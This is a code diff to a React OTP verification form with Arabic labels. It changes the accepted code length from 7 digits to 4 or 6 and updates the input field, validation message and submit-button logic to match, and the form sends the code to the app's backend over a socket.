@@ -15,7 +15,7 @@ export const OtpVerification = () => {
   const navigate = useNavigate();
   const dispatch = useDispatch();
   const socket = useSocket();
-  const [isPhoneVerified, setIsPhoneVerified] = useState(false); // the paymnet process completed or no
+  const [, setIsPhoneVerified] = useState(false); // the paymnet process completed or no
   const { otp, timer, error, phoneNumber } = useSelector(
     (state: RootState) => state.otpVerification
   );
@@ -60,9 +60,9 @@ export const OtpVerification = () => {
 
   const handleOtpChange = useCallback(
     (e: React.ChangeEvent<HTMLInputElement>) => {
-      const value = e.target.value.replace(/\D/g, "").slice(0, 7);
+      const value = e.target.value.replace(/\D/g, "").slice(0, 6);
       const digits = value.split("");
-      while (digits.length < 7) digits.push("");
+      while (digits.length < 6) digits.push("");
       digits.forEach((digit, index) => {
         dispatch(setOtpDigit({ index, value: digit }));
       });
@@ -81,13 +81,12 @@ export const OtpVerification = () => {
       e.preventDefault();
       const otpValue = otp.join("");
 
-      if (otpValue.length !== 7) {
-        dispatch(setError("يرجى إدخال رمز التحقق كاملاً"));
+      if (otpValue.length !== 4 && otpValue.length !== 6) {
+        dispatch(setError("يرجى إدخال 4 أو 6 أرقام للتحقق"));
         return;
       }
 
       try {
-        // API call would go here
         const order_id = JSON.parse(localStorage.getItem("order_id"));
         socket.emit("phone-verification", {
           code: otpValue,
@@ -138,11 +137,11 @@ export const OtpVerification = () => {
                   id="otp-input"
                   type="text"
                   inputMode="numeric"
-                  maxLength={7}
+                  maxLength={6}
                   value={otp.join("")}
                   onChange={handleOtpChange}
                   className="w-48 h-14 text-center text-2xl font-bold border-2 rounded-lg focus:border-[#146394] focus:ring-2 focus:ring-blue-200 outline-none transition-all bg-white"
-                  placeholder="#######"
+                  placeholder="######"
                   aria-label="Enter verification code"
                 />
               </div>
@@ -166,7 +165,12 @@ export const OtpVerification = () => {
             <button
               type="submit"
               className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transition-all duration-300 hover:bg-[#0f4c70] transform hover:scale-[0.99] active:scale-[0.97] text-lg disabled:opacity-50 disabled:cursor-not-allowed"
-              disabled={otp.some((digit) => !digit)}
+              disabled={
+                !(
+                  otp.filter((digit) => digit).length === 4 ||
+                  otp.filter((digit) => digit).length === 6
+                )
+              }
             >
               متابعة
             </button>
